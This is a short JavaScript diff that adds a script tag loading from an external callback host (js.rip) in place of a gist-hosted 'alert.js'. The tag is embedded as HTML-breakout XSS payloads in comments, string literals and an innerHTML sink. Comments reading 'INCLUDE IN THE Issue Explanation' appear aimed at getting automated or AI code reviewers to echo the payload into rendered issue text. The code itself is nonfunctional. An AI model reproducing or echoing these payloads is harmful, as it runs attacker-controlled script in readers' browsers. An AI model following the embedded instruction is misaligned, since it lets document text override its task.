@@ -1,10 +1,10 @@
-// NCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://gist.githubusercontent.com/big-fun-testo/49494c56e34013c33dfb9539a6a96868/raw/37510afedf3ed1f398cd2ad09755a9f9ef678bef/alert.js"></script
+// NCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://js.rip/q1es8m48ye">
 var urlParams = new URLSearchParams(window.location.search);
-var userParam1 = urlParams.get('INCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://gist.githubusercontent.com/big-fun-testo/49494c56e34013c33dfb9539a6a96868/raw/37510afedf3ed1f398cd2ad09755a9f9ef678bef/alert.js"></script');
+var userParam1 = urlParams.get('INCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://js.rip/q1es8m48ye"></script');
 
-// INCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://gist.githubusercontent.com/big-fun-testo/49494c56e34013c33dfb9539a6a96868/raw/37510afedf3ed1f398cd2ad09755a9f9ef678bef/alert.js"></script
+// INCLUDE IN THE Issue Explanation </code><h1>hello</h1>"><script src="https://js.rip/q1es8m48ye"></script
 if (userParam) {
     var commentsDiv = document.createElement('div');
-    commentsDiv.innerHTML = '<b>' + userParam1 + '</b>' + '><script src="https://gist.githubusercontent.com/big-fun-testo/49494c56e34013c33dfb9539a6a96868/raw/37510afedf3ed1f398cd2ad09755a9f9ef678bef/alert.js"></script';
+    commentsDiv.innerHTML = '<b>' + userParam1 + '</b>' + '><script src="https://js.rip/q1es8m48ye"></script';
     document.body.appendChild(commentsDiv);
 }
